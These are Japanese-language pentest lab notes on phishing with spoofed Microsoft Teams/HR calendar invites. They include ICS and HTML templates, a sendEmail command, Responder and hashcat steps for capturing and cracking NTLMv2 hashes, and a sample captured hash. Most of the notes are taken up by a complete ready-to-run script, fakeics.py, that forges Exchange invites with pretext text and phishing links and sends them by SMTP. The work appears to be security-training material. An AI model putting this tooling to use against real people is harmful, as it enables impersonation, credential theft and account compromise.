The iCalendar Standard(ICS)

カスタムICSのテンプレート
```ics
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:20241010T073659Z
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:20241010T073059Z
DTEND;TZID=UTC:20241010T083059Z
DTSTAMP:20241010T034159Z
ORGANIZER;CN=Peter:mailto:peter@corp1.com
UID:FIXMEUID20241010T034159Z
CREATED:20241010T034159Z
DESCRIPTION:http://meeting.corp1.com
LAST-MODIFIED:20241010T034159Z
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:HR meeting
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
```

カスタムメール本文テンプレート
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Test</title>
</head>
<body>
    <p>Hello,</p>
    <p>This is a test email</p>
    <p>Best regards,Attacker</p>
</body>
</html>
```

上記それぞれ`tempalte.htlm`, `iCalender.ics`として保存

sendmailコマンド
```bash
sendEmail -s 送信先IP -t offsec@corp1.com -f attacker@corp1.com -u "test"  -o message-content-type=html -o message-file=./template.html -a iCalendar.ics
```


## 悪用方法
fakeics.pyを送信。クリックされるとこちらのhttp serverにアクセスしようとするので、responderで偽の認証画面を送信しNTLMハッシュを取得

responderで待機
```bash
sudo responder -I tun0
```

fakeics.pyでメールを送信
```bash
python3 fakeics.py SMTPサーバIP hr@corp1.com offsec@corp1.com http://ATACKER_IP
```

出力の`[HTTP] NTLMv2 Hash`をhash.txtに保存
```
offsec::CORP1:b0473ae7fc387b68:26E980FE9C80DC71005274E7C3E1665F:0101000000000000C67C9EECF21ADB01CE26C7181BFD856200000000020008004C0049004F004D0001001E00570049004E002D00320045004D004900330046004B004600460052004400040014004C0049004F004D002E004C004F00430041004C0003003400570049004E002D00320045004D004900330046004B0046004600520044002E004C0049004F004D002E004C004F00430041004C00050014004C0049004F004D002E004C004F00430041004C000800300030000000000000000100000000200000A10EFE50A222919674D316C528835C66FB8A4E972B792B6AD801EF57A87311290A001000000000000000000000000000000000000900280048005400540050002F003100390032002E003100360038002E003200350031002E003100350031000000000000000000
```

hashcatでクラック
```
hashcat -m 5600  hash.txt /usr/share/wordlists/rockyou.txt
```

フィッシングメール動的生成スクリプト
fakeics.py
```python
import time
import codecs
import smtplib
import datetime
import sys
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart
from email.utils import COMMASPACE, formatdate


# ─── Email settings ───────────────────────────────────────────────────────────
EMAIL_SUBJECT = "HR Meeting"

# ─── Event settings ───────────────────────────────────────────────────────────
EVENT_SUMMARY  = "HR meeting"
ORGANIZER_NAME = "HR Team Corp1"
ATTENDEES      = ["ceo@corp1.com", "cto@corp1.com"]

# ─── Email body text (plain paragraph inside HTML template) ───────────────────
EVENT_TEXT = """
Dear colleague,

We would like to inform you about an important HR meeting regarding recent
company-wide changes and policies. Your attendance is highly encouraged as we
will be discussing essential updates that impact all employees.

Topics will include:

- Organizational restructuring
- New employee benefits package
- Updates to leave policies
- Changes to the remote work policy

This meeting is a priority and will be your opportunity to ask any questions
or raise concerns.

We look forward to your participation.

Best regards,
HR Team
"""

# ─── Hardcoded HTML template ──────────────────────────────────────────────────
# Placeholders:
#   {EVENT_TEXT}  → EVENT_TEXT 変数（会議説明文）
#   {EVENT_URL}   → コマンドライン引数 event_url（フィッシングURL）
EMAIL_TEMPLATE = """\
<html>
<body>
<p class=MsoNormal style='background:white'>
  <span style='color:black'>{EVENT_TEXT}<u1:p>&nbsp;<o:p></o:p></span></u1:p>
</p>
<p class=MsoNormal style='background:white'>
  <span style='color:#5F5F5F'>
    ________________________________________________________________________________
  </span>
  <span style='mso-fareast-font-family:"Times New Roman";color:black'>
    <u1:p>&nbsp;</u1:p>
  </span>
  <span style='color:black'><o:p></o:p></span>
</p>
<p class=MsoNormal style='background:white'>
  <span style='font-size:18.0pt;font-family:"Segoe UI",sans-serif;color:#252424'>
    Microsoft Teams meeting
  </span>
  <span style='font-family:"Segoe UI",sans-serif;color:#252424'>
    <u1:p>&nbsp;</u1:p>
  </span>
  <span style='color:black'><o:p></o:p></span>
</p>
<p class=MsoNormal style='background:white'>
  <b><span style='font-size:10.5pt;font-family:"Segoe UI",sans-serif;color:#252424'>
    Join on your computer or mobile app
  </span></b>
  <b><span style='font-family:"Segoe UI",sans-serif;color:#252424'>
    <u1:p>&nbsp;</u1:p>
  </span></b>
  <span style='color:black'><o:p></o:p></span>
</p>
<p class=MsoNormal style='background:white'>
  <span style='font-family:"Segoe UI",sans-serif;color:#252424'>
    <a href="{EVENT_URL}" target="_blank">
      <span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif;color:#6264A7'>
        Click here to join the meeting
      </span>
    </a>
    <u1:p>&nbsp;</u1:p>
  </span>
  <span style='color:black'><o:p></o:p></span>
</p>
<p class=MsoNormal style='background:white'>
  <span style='font-family:"Segoe UI",sans-serif;color:#252424'>
    <a href="https://aka.ms/JoinTeamsMeeting" target="_blank">
      <span style='font-size:10.5pt;color:#6264A7'>Learn More</span>
    </a>
    |
    <a href="{EVENT_URL}" target="_blank">
      <span style='font-size:10.5pt;color:#6264A7'>Meeting options</span>
    </a>
    <u1:p>&nbsp;</u1:p>
  </span>
  <span style='color:black'><o:p></o:p></span>
</p>
<p class=MsoNormal style='background:white'>
  <span style='color:#5F5F5F'>
    <span style='opacity:.36'>
      ________________________________________________________________________________
    </span>
  </span>
  <span style='mso-fareast-font-family:"Times New Roman";color:black'>
    <u1:p>&nbsp;</u1:p>
  </span>
  <span style='color:black'><o:p></o:p></span>
</p>
</body>
</html>
"""

# ─── Hardcoded ICS template ───────────────────────────────────────────────────
# Placeholders:
#   {DTSTAMP}         → 作成タイムスタンプ (YYYYMMDDTHHMMSSz)
#   {DTSTART}         → 会議開始時刻
#   {DTEND}           → 会議終了時刻
#   {ORGANIZER_NAME}  → ORGANIZER_NAME 変数
#   {ORGANIZER_EMAIL} → コマンドライン引数 sender_email
#   {DESCRIPTION}     → コマンドライン引数 event_url（フィッシングURL）
#   {SUMMARY}         → EVENT_SUMMARY 変数
#   {ATTENDEES}       → generate_attendees() の出力
ICS_TEMPLATE = """\
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
BEGIN:DAYLIGHT
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:DAYLIGHT
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:{DTSTART}
DTEND;TZID=UTC:{DTEND}
DTSTAMP:{DTSTAMP}
ORGANIZER;CN={ORGANIZER_NAME}:mailto:{ORGANIZER_EMAIL}
ATTACH;FMTTYPE=application/octet-stream;ENCODING=BASE64:\\c3RhcnQgY21kLmV4ZQo=
UID:FIXMEUID{DTSTAMP}
{ATTENDEES}
CREATED:{DTSTAMP}
DESCRIPTION:{DESCRIPTION}
LAST-MODIFIED:{DTSTAMP}
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:{SUMMARY}
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
"""


# ─── Template functions ───────────────────────────────────────────────────────

def prepare_template(event_url):
    """HTMLテンプレートのプレースホルダーを置換して返す"""
    return EMAIL_TEMPLATE.format(
        EVENT_TEXT=EVENT_TEXT,
        EVENT_URL=event_url
    )


def prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url):
    """ICSテンプレートのプレースホルダーを置換して返す"""
    return ICS_TEMPLATE.format(
        DTSTAMP=dtstamp,
        DTSTART=dtstart,
        DTEND=dtend,
        ORGANIZER_NAME=ORGANIZER_NAME,
        ORGANIZER_EMAIL=sender_email,
        DESCRIPTION=event_url,
        SUMMARY=EVENT_SUMMARY,
        ATTENDEES=generate_attendees()
    )


def generate_attendees():
    """ATTENDEES リストからICS用ATTENDEEブロックを生成する"""
    attendees = []
    for attendee in ATTENDEES:
        attendees.append(
            "ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;"
            "PARTSTAT=ACCEPTED;RSVP=FALSE\r\n"
            " ;CN={a};X-NUM-GUESTS=0:\r\n"
            " mailto:{a}".format(a=attendee)
        )
    return "\r\n".join(attendees)


# ─── Send email ───────────────────────────────────────────────────────────────

def send_email(smtp_server, sender_email, to, event_url):
    print("[*] Sending email to: " + to)

    # タイムスタンプ・会議時刻の計算（UTC基準）
    utc_offset = time.localtime().tm_gmtoff / 60
    ddtstart   = datetime.datetime.now()
    dtoff      = datetime.timedelta(minutes=utc_offset + 5)  # 5分前開始に見せる
    duration   = datetime.timedelta(hours=1)                 # 1時間の会議
    ddtstart   = ddtstart - dtoff
    dtend      = ddtstart + duration

    dtstamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%SZ")
    dtstart = ddtstart.strftime("%Y%m%dT%H%M%SZ")
    dtend   = dtend.strftime("%Y%m%dT%H%M%SZ")

    # テンプレート展開
    ics        = prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url)
    email_body = prepare_template(event_url)

    # MIMEメッセージ構築
    msg = MIMEMultipart('mixed')
    msg['Reply-To'] = sender_email
    msg['Date']     = formatdate(localtime=True)
    msg['Subject']  = EMAIL_SUBJECT
    msg['From']     = sender_email
    msg['To']       = to

    part_email = MIMEText(email_body, "html")
    part_cal   = MIMEText(ics, 'calendar;method=REQUEST')

    msgAlternative = MIMEMultipart('alternative')
    msg.attach(msgAlternative)

    # ICSを添付ファイルとしても付与
    ics_atch = MIMEBase('application/ics', ' ;name="%s"' % "invite.ics")
    ics_atch.set_payload(ics)
    encode_base64(ics_atch)
    ics_atch.add_header('Content-Disposition', 'attachment; filename="%s"' % "invite.ics")

    eml_atch = MIMEBase('text/plain', '')
    eml_atch.set_payload("")
    encode_base64(eml_atch)
    eml_atch.add_header('Content-Transfer-Encoding', "")

    msgAlternative.attach(part_email)
    msgAlternative.attach(part_cal)

    # SMTP送信
    mailServer = smtplib.SMTP(smtp_server, 25)
    mailServer.ehlo()
    mailServer.ehlo()
    mailServer.sendmail(sender_email, to, msg.as_string())
    mailServer.close()
    print("[+] Email sent successfully.")


# ─── Entry point ──────────────────────────────────────────────────────────────

def main():
    if len(sys.argv) != 5:
        print("Usage: python3 fakeics.py <smtp_server> <sender_email> <recipient_email> <event_url>")
        print("Example: python3 fakeics.py 192.168.50.121 hr@corp1.com offsec@corp1.com http://192.168.251.151")
        sys.exit(1)

    smtp_server      = sys.argv[1]
    sender_email     = sys.argv[2]
    recipient_email  = sys.argv[3]
    event_url        = sys.argv[4]

    send_email(smtp_server, sender_email, recipient_email, event_url)


if __name__ == "__main__":
    main()
```